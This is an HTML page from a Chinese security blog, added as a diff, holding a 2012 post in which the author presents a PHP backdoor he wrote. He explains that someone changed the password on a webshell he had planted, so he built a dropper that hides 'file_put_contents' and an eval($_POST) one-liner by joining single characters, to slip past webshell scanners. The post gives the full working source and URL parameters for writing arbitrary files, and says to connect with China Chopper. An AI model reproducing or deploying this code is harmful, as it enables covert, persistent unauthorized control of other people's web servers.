@@ -1,0 +1,243 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>自己写的一个PHP后门 | Return&#39;s Blog </title>
+  <meta name="author" content="Return">
+  
+  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
+  
+  
+  <meta property="og:title" content="自己写的一个PHP后门"/>
+  <meta property="og:site_name" content="Return&#39;s Blog "/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+   <link rel="apple-touch-icon" href="/icon.png" />
+   <link rel="shortcut icon" href="/favicon.png" >
+   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
+</head>
+
+
+<body>
+  <div id="content" class="inner">
+    <aside id="sidebar" class="alignleft">
+      <div class="navigationBar">
+        <a href="/">Return&#39;s Blog </a>
+      </div>
+    	
+  <nav class="widget" id="menu">
+	<ul>
+    
+      <li class="cell"><a class="next" href="/">Home</a><li>
+    
+      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
+    
+      <li class="cell"><a class="next" href="/about/">About</a><li>
+    
+    </ul>
+</nav>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
+  
+    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
+  
+    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
+  
+    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
+  
+    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
+  </div>
+</div>
+
+
+    	<footer id="footer" class="inner"><div class="copyright">
+  
+  &copy; 2014 Return
+  
+</div>
+
+
+<div style="position:relative; bottom: 23px">
+  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
+  </script>
+</div>
+
+
+</footer>
+    </aside>
+    
+    
+    <div id="hidden-navigationBar" class="navigationBar">
+      <a href="/">Return&#39;s Blog </a>
+    </div>
+    <div id="main-col" class="alignright">
+    <div id="wrapper">
+      
+<article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+  <header>
+      
+      
+  
+    <h1 class="title">自己写的一个PHP后门</h1>
+  
+
+      <time datetime="2012-07-01T04:58:04.000Z"><a href="/html/2012-07-01-自己写的一个php后门.html">7月 1 2012</a></time>
+      
+  </header>
+    <div class="entry">
+      
+        <p>今天去连接很久以前的一个shell(目的是做个实验)结果~~被人改密码了。 好吧，你丫的改，看看我怎么收拾你。</p>
+<p>所以就想写一个后门，为啥呢？省的又被改或者删了呗，现在的大马带有后门检测功能。所以为了防止被杀。。。。</p>
+<p>其实这个后门的思路是来自之前在思派尔工作的头，他当时给我看了一个别人的后门结果一看真的很猥琐，</p>
+<p>全部用连接符连接起来的字符串查杀木马的程序在强大也不可能把这个查出来的，所有就有了今天这个后门。</p>
+<h3 id="-">代码：</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="code"><pre>
+<span class="preprocessor">&lt;?php</span>
+<span class="comment">/*
+ * PHP后门程序
+ * 使用说明：此程序默认会在当前目录下生成一句话cmd.php密码cmd
+ * 不含有任何敏感函数有它也查不出来所以免杀是必然的。生成的一句
+ * 不是免杀的，要免杀原理已经能看到了，自行处理。
+ * 亲，使用的时候注意删除这里的注释~~
+ * BY: Return Data:2012.6.29
+ */</span>
+<span class="function"><span class="keyword">function</span> <span class="title">scm</span><span class="params">()</span>{</span>
+ <span class="variable">$pod</span> = <span class="string">'123'</span>; <span class="comment">//密码</span>
+ <span class="variable">$_GET</span>[<span class="string">'ct'</span>] == <span class="variable">$pod</span> ? <span class="string">''</span> : <span class="keyword">exit</span>();
+ <span class="variable">$fcn</span> = <span class="string">'f'</span>.<span class="string">'i'</span>.<span class="string">'l'</span>.<span class="string">'e'</span>.<span class="string">'_'</span>.<span class="string">'p'</span>.<span class="string">'u'</span>.<span class="string">'t'</span>.<span class="string">'_'</span>.<span class="string">'c'</span>.<span class="string">'o'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'e'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'s'</span>;
+ <span class="keyword">if</span>(@<span class="variable">$_GET</span>[<span class="string">'sf'</span>]==<span class="string">'yes'</span>){
+ <span class="variable">$fnm</span> = <span class="variable">$_GET</span>[<span class="string">'filepath'</span>];
+ <span class="variable">$fct</span> = <span class="variable">$_GET</span>[<span class="string">'content'</span>];
+ }<span class="keyword">else</span>{
+ <span class="variable">$fnm</span> = <span class="string">'c'</span>.<span class="string">'m'</span>.<span class="string">'d'</span>.<span class="string">'.'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>;
+ <span class="variable">$fct</span> = <span class="string">'&lt;'</span>.<span class="string">'?'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>.<span class="string">' @'</span>.<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'('</span>.<span class="string">'$'</span>.<span class="string">'_'</span>.<span class="string">'P'</span>.<span class="string">'O'</span>.<span class="string">'S'</span>.<span class="string">'T'</span>.<span class="string">'['</span>.<span class="string">'&quot;'</span>.<span class="string">'c'</span>.<span class="string">'m'</span>.<span class="string">'d'</span>.<span class="string">'&quot;'</span>.<span class="string">']'</span>.<span class="string">')'</span>.<span class="string">'?'</span>.<span class="string">'&gt;'</span>;
+ }
+ @<span class="variable">$fcn</span>(<span class="variable">$fnm</span>, <span class="variable">$fct</span>);
+ <span class="keyword">echo</span> <span class="string">'succeed!'</span>;
+}
+scm();
+<span class="preprocessor">?&gt;</span>
+</pre></td></tr></table></figure>
+
+<p><a id="more"></a></p>
+<h2 id="-">使用方法：</h2>
+<p>参数：ct 为密码 ，sf 为是否使用自定义内容，</p>
+<p>filepath 自定义文件路径，content 自定义文件内容</p>
+<p>自带后门生成方法 ： door.php?ct=密码</p>
+<p>自定义后门生成方法： door.php?ct=密码&amp;sf=yes&amp;filepath=文件路径&amp;content=文件内容</p>
+<p>注意：</p>
+<p>自动生成后门会在当前目录下生成一个cmd.php密码为cmd的一句话，怎么使用一句话？</p>
+<p>菜刀连接，你懂得~~</p>
+
+	 
+	     <p style="margin:20px 0; color:#9f9f9f; font-size:12px;">
+<span>Posted by <a style="color:#9f9f9f;" href="null"><strong>creturn</strong></a> - 7月 1 2012</span><br />
+<span style="line-height:13px;">如需转载，请注明： 本文来自 <a style="color:#9f9f9f;" href="http://creturn.com"><strong>Return&#39;s Blog </strong></a></span>
+</p>
+       	 
+      
+    </div>
+    <footer>
+      
+	 
+     		  
+  
+  <div class="categories">
+    <a href="/categories/原创作品/">原创作品</a>
+  </div>
+
+       		
+  
+  <div class="tags">
+    <a href="/tags/后门/">后门</a>
+  </div>
+
+     		  
+       	 
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div>
+    </div>
+    <div class="tabbar" onload="divideTabBar()">
+	
+      <div class="tabbaritem"><a class="next" href="/">Home</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/archives/">Archives</a></div>
+    
+      <div class="tabbaritem"><a class="next" href="/about/">About</a></div>
+    
+</div>
+
+
+  </div>
+</body>
+</html>
